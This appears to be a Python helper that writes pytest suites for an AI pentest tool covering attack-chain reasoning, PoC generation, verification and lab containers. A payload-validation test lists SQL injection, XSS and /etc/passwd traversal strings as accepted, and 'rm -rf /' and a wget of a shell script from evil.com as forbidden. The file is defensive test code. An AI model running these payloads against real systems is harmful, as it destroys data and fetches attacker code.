"""Helper script to write all v3 test files."""
import os

TESTS_DIR = r"C:\Users\lenovo\xuanjian-ai\tests\unit"
os.makedirs(TESTS_DIR, exist_ok=True)


def write_file(name, content):
    path = os.path.join(TESTS_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"Wrote {path}: {len(content)} chars")


# ── test_v3_attack_reasoner.py ──
write_file("test_v3_attack_reasoner.py", '''"""
V3.0 AI Pentest - Attack Chain Reasoner Tests
"""
import pytest
from fp_sentinel.models import Finding, Severity
from fp_sentinel.attack.v3_ai_pentest.attack_chain_reasoner import (
    AttackChainReasoner,
    ChainReasoningReport,
    ReasoningChain,
    VisualizationFormat,
    to_mermaid,
    to_dot,
    to_json_graph,
    to_ascii,
    to_html,
    _multi_head_attention,
    _compute_centrality,
    _infer_difficulty,
    _generate_attack_scenario,
    _REMEDIATION_MAP,
)
from fp_sentinel.analysis.chain_discovery import VulnerabilityGraph, GraphNode, NodeType


def _f(rule_id, line, code, severity=Severity.HIGH, file_path="app.py"):
    return Finding(scanner="test", rule_id=rule_id, severity=severity,
                   file_path=file_path, line_start=line, code_snippet=code)


class TestMultiHeadAttention:
    def test_multi_head_returns_correct_structure(self):
        graph = VulnerabilityGraph()
        n1 = GraphNode(id="a", node_type=NodeType.VULNERABILITY, label="xss",
                       file_path="app.py", line_number=10, rule_id="xss")
        n2 = GraphNode(id="b", node_type=NodeType.VULNERABILITY, label="sqli",
                       file_path="app.py", line_number=20, rule_id="sql-injection")
        graph.add_node(n1); graph.add_node(n2)
        from fp_sentinel.analysis.chain_discovery import GraphEdge, EdgeType
        graph.add_edge(GraphEdge(source="a", target="b", edge_type=EdgeType.DATA_FLOW))
        per_head, avg = _multi_head_attention(graph, {"a": 50.0, "b": 30.0}, num_heads=4)
        assert len(per_head) == 4
        assert ("a", "b") in avg
        assert avg[("a", "b")] > 0

    def test_softmax_normalization(self):
        graph = VulnerabilityGraph()
        n1 = GraphNode(id="a", node_type=NodeType.VULNERABILITY, label="xss",
                       file_path="app.py", line_number=10, rule_id="xss")
        n2 = GraphNode(id="b", node_type=NodeType.VULNERABILITY, label="sqli",
                       file_path="app.py", line_number=20, rule_id="sql-injection")
        n3 = GraphNode(id="c", node_type=NodeType.VULNERABILITY, label="cmd",
                       file_path="app.py", line_number=30, rule_id="command-injection")
        graph.add_node(n1); graph.add_node(n2); graph.add_node(n3)
        from fp_sentinel.analysis.chain_discovery import GraphEdge, EdgeType
        graph.add_edge(GraphEdge(source="a", target="b", edge_type=EdgeType.DATA_FLOW))
        graph.add_edge(GraphEdge(source="a", target="c", edge_type=EdgeType.DATA_FLOW))
        per_head, avg = _multi_head_attention(graph, {"a": 50.0, "b": 30.0, "c": 20.0})
        assert len(per_head) == 4
        sum_a = avg.get(("a", "b"), 0) + avg.get(("a", "c"), 0)
        assert abs(sum_a - 1.0) < 0.01

    def test_empty_graph(self):
        graph = VulnerabilityGraph()
        per_head, avg = _multi_head_attention(graph, {}, num_heads=4)
        assert avg == {}
        assert all(h == {} for h in per_head.values())


class TestComputeCentrality:
    def test_hub_node(self):
        graph = VulnerabilityGraph()
        for i in range(5):
            n = GraphNode(id=f"n{i}", node_type=NodeType.VULNERABILITY, label=f"v{i}",
                          file_path="app.py", line_number=i*10, rule_id=f"rule-{i}")
            graph.add_node(n)
        from fp_sentinel.analysis.chain_discovery import GraphEdge, EdgeType
        for i in range(1, 5):
            graph.add_edge(GraphEdge(source="n0", target=f"n{i}", edge_type=EdgeType.DATA_FLOW))
        cent = _compute_centrality(graph)
        assert cent["n0"] == 1.0
        assert all(cent[f"n{i}"] < 1.0 for i in range(1, 5))

    def test_empty(self):
        graph = VulnerabilityGraph()
        cent = _compute_centrality(graph)
        assert cent == {}


class TestInferDifficulty:
    def test_easy(self):
        chain = ReasoningChain(nodes=[])
        result = _infer_difficulty(chain)
        # empty chain defaults
        assert result in ("EASY", "MEDIUM", "HARD", "EXTREME")


class TestAttackChainReasoner:
    def test_reason_simple_chain(self):
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
            _f("py.injection.command", 30, "os.system(cmd)"),
        ]
        reasoner = AttackChainReasoner()
        report = reasoner.reason(findings, project="test")
        assert report.total_findings == 3
        assert len(report.chains) >= 1
        assert report.attention_heads == 4

    def test_reason_empty_findings(self):
        reasoner = AttackChainReasoner()
        report = reasoner.reason([])
        assert report.total_findings == 0
        assert len(report.chains) == 0

    def test_reason_single_finding(self):
        findings = [_f("py.crypto.weak_hash", 5, "hashlib.md5(x)")]
        reasoner = AttackChainReasoner()
        report = reasoner.reason(findings)
        assert report.total_findings == 1
        assert len(report.chains) == 0
        assert len(report.isolated_findings) == 1

    def test_chain_properties(self):
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
        ]
        reasoner = AttackChainReasoner()
        report = reasoner.reason(findings)
        if report.chains:
            chain = report.chains[0]
            assert chain.overall_risk > 0
            assert 0 < chain.chain_probability <= 100
            assert chain.severity in ("CRITICAL", "HIGH", "MEDIUM", "LOW")
            assert len(chain.remediation) > 0

    def test_chains_sorted_by_risk(self):
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
            _f("py.injection.command", 30, "os.system(cmd)"),
        ]
        reasoner = AttackChainReasoner()
        report = reasoner.reason(findings)
        risks = [c.overall_risk for c in report.chains]
        assert risks == sorted(risks, reverse=True)

    def test_graph_stats(self):
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
        ]
        reasoner = AttackChainReasoner()
        report = reasoner.reason(findings)
        assert report.graph_stats["total_nodes"] == 2

    def test_custom_attention_heads(self):
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
        ]
        reasoner = AttackChainReasoner(attention_heads=8)
        report = reasoner.reason(findings)
        assert report.attention_heads == 8

    def test_node_roles(self):
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
        ]
        reasoner = AttackChainReasoner()
        report = reasoner.reason(findings)
        for chain in report.chains:
            for node in chain.nodes:
                assert node.node_role in ("entry", "intermediate", "sink", "isolated")


class TestVisualizationExports:
    def _make_report(self):
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
        ]
        return AttackChainReasoner().reason(findings)

    def test_to_mermaid(self):
        report = self._make_report()
        mermaid = to_mermaid(report)
        assert "flowchart LR" in mermaid

    def test_to_dot(self):
        report = self._make_report()
        dot = to_dot(report)
        assert dot.startswith("digraph AttackChains")

    def test_to_json_graph(self):
        report = self._make_report()
        jg = to_json_graph(report)
        assert "nodes" in jg and "edges" in jg

    def test_to_ascii(self):
        report = self._make_report()
        ascii_art = to_ascii(report)
        assert len(ascii_art) > 0

    def test_to_html(self):
        report = self._make_report()
        html = to_html(report)
        assert "<!DOCTYPE html>" in html

    def test_empty_report_vis(self):
        report = ChainReasoningReport()
        assert to_ascii(report) is not None
        assert to_mermaid(report) is not None


class TestVisualizationFormat:
    def test_enum(self):
        assert VisualizationFormat.MERMAID.value == "mermaid"
        assert VisualizationFormat.HTML.value == "html"
''')


# ── test_v3_poc_generator.py ──
write_file("test_v3_poc_generator.py", '''"""
V3.0 AI Pentest - PoC Auto Generator Tests
"""
import pytest
from fp_sentinel.attack.v3_ai_pentest.poc_auto_generator import (
    PoCAutoGenerator,
    ChainAwarePocResult,
    GeneratedPocScript,
    generate_chain_poc,
    generate_verification_suite,
    _validate_payload,
    _FORBIDDEN_PAYLOAD_PATTERNS,
)
from fp_sentinel.attack.poc_templates import UnsafeTargetError


class TestPayloadValidation:
    def test_default_payload_returned_for_empty(self):
        result = _validate_payload("", "sqli-union")
        assert result != ""

    def test_valid_payloads_accepted(self):
        valid = [
            "1\\' UNION SELECT null-- -",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "; echo fp_sentinel_verify",
        ]
        for p in valid:
            result = _validate_payload(p, "sqli-union")
            assert result == p

    def test_forbidden_payloads_rejected(self):
        with pytest.raises(ValueError):
            _validate_payload("rm -rf /", "cmd-injection")

    def test_forbidden_external_fetch(self):
        with pytest.raises(ValueError):
            _validate_payload("wget http://evil.com/shell.sh", "cmd-injection")


class TestPoCAutoGenerator:
    def setup_method(self):
        self.gen = PoCAutoGenerator(default_target="http://127.0.0.1:8080")

    def test_generate_single_sqli(self):
        script = self.gen.generate_single("sqli-union")
        assert isinstance(script, GeneratedPocScript)
        assert script.vuln_type == "sqli-union"
        assert "127.0.0.1" in script.target

    def test_generate_single_custom_payload(self):
        script = self.gen.generate_single("sqli-union", payload="1\\' OR 1=1-- -")
        assert script.custom_payload_used
        assert "1\\' OR 1=1" in script.script_content

    def test_generate_single_invalid_target(self):
        with pytest.raises(UnsafeTargetError):
            self.gen.generate_single("sqli-union", target="http://evil.com")

    def test_generate_single_unknown_vuln_type(self):
        with pytest.raises(KeyError):
            self.gen.generate_single("no-such-vuln-type")

    def test_generate_for_chain(self):
        from fp_sentinel.attack.v3_ai_pentest.attack_chain_reasoner import ReasoningChain
        from fp_sentinel.models import Finding, Severity
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = self.gen.generate_for_chain(report.chains[0])
            assert isinstance(result, ChainAwarePocResult)
            assert len(result.scripts) >= 2
            assert result.combined_script != ""
            assert len(result.verification_plan) >= 2

    def test_generate_for_chain_with_custom_payload(self):
        from fp_sentinel.models import Finding, Severity
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = self.gen.generate_for_chain(
                report.chains[0],
                custom_payloads={1: "custom-test-payload"}
            )
            assert isinstance(result, ChainAwarePocResult)

    def test_generate_verification_suite(self):
        from fp_sentinel.models import Finding, Severity
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        results = self.gen.generate_for_report(report)
        assert isinstance(results, list)


class TestConvenienceAPIs:
    def test_generate_chain_poc_func(self):
        from fp_sentinel.models import Finding, Severity
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = generate_chain_poc(report.chains[0])
            assert isinstance(result, ChainAwarePocResult)


class TestGeneratedPocScript:
    def test_script_has_safety_notes(self):
        gen = PoCAutoGenerator()
        script = gen.generate_single("sqli-union")
        assert len(script.safety_notes) > 0

    def test_script_has_run_instructions(self):
        gen = PoCAutoGenerator()
        script = gen.generate_single("sqli-union")
        assert script.run_instructions != ""
''')


# ── test_v3_auto_verifier.py ──
write_file("test_v3_auto_verifier.py", '''"""
V3.0 AI Pentest - Auto Verifier Tests
"""
from fp_sentinel.models import Finding, Severity
from fp_sentinel.attack.v3_ai_pentest.auto_verifier import (
    AutoVerifier,
    VerificationRecord,
    VerificationSession,
    VerificationMethod,
    verify_attack_chain,
)
from fp_sentinel.attack.target_validator import VerifyStatus


def _f(rule_id, line, code, severity=Severity.HIGH, file_path="app.py"):
    return Finding(scanner="test", rule_id=rule_id, severity=severity,
                   file_path=file_path, line_start=line, code_snippet=code)


class TestAutoVerifier:
    def test_verify_single_finding(self):
        verifier = AutoVerifier(allow_docker=False)
        finding = _f("py.injection.sql", 10, "q = SELECT || uid")
        record = verifier.verify_finding(finding)
        assert isinstance(record, VerificationRecord)
        assert record.rule_id == "py.injection.sql"
        assert record.status in (VerifyStatus.SIMULATED, VerifyStatus.MANUAL_REQUIRED)

    def test_verify_source_unreadable(self):
        verifier = AutoVerifier(allow_docker=False)
        finding = _f("py.injection.sql", 10, "q = x", file_path="/nonexistent/file.py")
        record = verifier.verify_finding(finding)
        assert record.status == VerifyStatus.MANUAL_REQUIRED

    def test_verify_findings_batch(self):
        verifier = AutoVerifier(allow_docker=False)
        findings = [
            _f("py.injection.sql", 10, "q = SELECT || uid"),
            _f("py.xss.dom", 20, "el.innerHTML = x"),
        ]
        session = verifier.verify_findings(findings)
        assert isinstance(session, VerificationSession)
        assert session.total_findings == 2
        assert len(session.records) == 2

    def test_verify_attack_chain(self):
        from fp_sentinel.attack.v3_ai_pentest.attack_chain_reasoner import ReasoningChain
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            record = verify_attack_chain(report.chains[0], allow_docker=False)
            assert isinstance(record, VerificationRecord)
            assert record.rule_id == "attack_chain"

    def test_verification_record_to_dict(self):
        record = VerificationRecord(
            finding_id="test-1", rule_id="py.xss.dom",
            file_path="app.py", line=10,
            status=VerifyStatus.SIMULATED,
            method="feature_match", evidence="test evidence",
        )
        d = record.to_dict()
        assert d["rule_id"] == "py.xss.dom"
        assert d["status"] == "simulated"

    def test_session_summary(self):
        verifier = AutoVerifier(allow_docker=False)
        findings = [_f("py.injection.sql", 10, "q = SELECT || uid")]
        session = verifier.verify_findings(findings)
        summary = session.summary()
        assert "total" in summary
        assert summary["total"] == 1


class TestVerifyAttackChainConvenience:
    def test_convenience_func_no_docker(self):
        findings = [
            _f("py.xss.dom", 10, "v = request.args"),
            _f("py.injection.sql", 20, "q = SELECT || uid"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = verify_attack_chain(report.chains[0], allow_docker=False)
            assert result.status in (VerifyStatus.SIMULATED, VerifyStatus.MANUAL_REQUIRED)


class TestVerificationMethod:
    def test_enum(self):
        assert VerificationMethod.DOCKER_PROBE.value == "docker_probe"
        assert VerificationMethod.FEATURE_MATCH.value == "feature_match"
''')


# ── test_v3_lab_environment.py ──
write_file("test_v3_lab_environment.py", '''"""
V3.0 AI Pentest - Lab Environment Tests
"""
import pytest
from fp_sentinel.attack.v3_ai_pentest.lab_environment import (
    LabEnvironment,
    LabTarget,
    LabStatus,
    ContainerBackend,
    DEFAULT_TARGETS,
)


class TestLabTarget:
    def test_default_construction(self):
        target = LabTarget(name="test")
        assert target.name == "test"
        assert target.internal_port == 80
        assert target.host_port == 0

    def test_custom_ports(self):
        target = LabTarget(name="test", internal_port=5000, host_port=18080)
        assert target.internal_port == 5000
        assert target.host_port == 18080


class TestLabEnvironment:
    def test_degraded_mode(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        assert lab.is_degraded
        assert not lab.has_container_runtime

    def test_simulated_target(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        target = LabTarget(name="test", internal_port=5000)
        info = lab.start_target(target, wait_ready=False)
        assert info.status == LabStatus.DEGRADED
        assert info.host_port >= 18080
        lab.stop_all()

    def test_allocate_port(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        port = lab._allocate_port()
        assert port >= LabEnvironment.PORT_RANGE_START
        assert port in lab._used_ports

    def test_port_reuse_on_stop(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        target = LabTarget(name="test1", internal_port=5000)
        info = lab.start_target(target, wait_ready=False)
        port = info.host_port
        lab.stop_target("test1")
        assert port not in lab._used_ports

    def test_get_target(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        target = LabTarget(name="test", internal_port=5000)
        lab.start_target(target, wait_ready=False)
        info = lab.get_target("test")
        assert info is not None
        assert info.name == "test"
        lab.stop_all()

    def test_list_targets(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        lab.start_target(LabTarget(name="t1"), wait_ready=False)
        lab.start_target(LabTarget(name="t2"), wait_ready=False)
        targets = lab.list_targets()
        assert len(targets) == 2
        lab.stop_all()

    def test_stop_all(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        lab.start_target(LabTarget(name="t1"), wait_ready=False)
        lab.start_target(LabTarget(name="t2"), wait_ready=False)
        lab.stop_all()
        assert lab.target_count == 0

    def test_health_check_nonexistent(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        assert not lab.health_check("nonexistent")

    def test_target_count(self):
        lab = LabEnvironment(backend=ContainerBackend.NONE)
        assert lab.target_count == 0
        lab.start_target(LabTarget(name="t1"), wait_ready=False)
        assert lab.target_count == 1
        lab.stop_all()
        assert lab.target_count == 0


class TestDefaultTargets:
    def test_targets_exist(self):
        assert "python-vuln-app" in DEFAULT_TARGETS
        assert "js-vuln-app" in DEFAULT_TARGETS

    def test_target_ports_unique(self):
        ports = [t.host_port for t in DEFAULT_TARGETS.values() if t.host_port > 0]
        assert len(ports) == len(set(ports))


class TestContainerBackend:
    def test_enum_values(self):
        assert ContainerBackend.DOCKER.value == "docker"
        assert ContainerBackend.PODMAN.value == "podman"
        assert ContainerBackend.NONE.value == "none"
''')


print("All test files written successfully!")
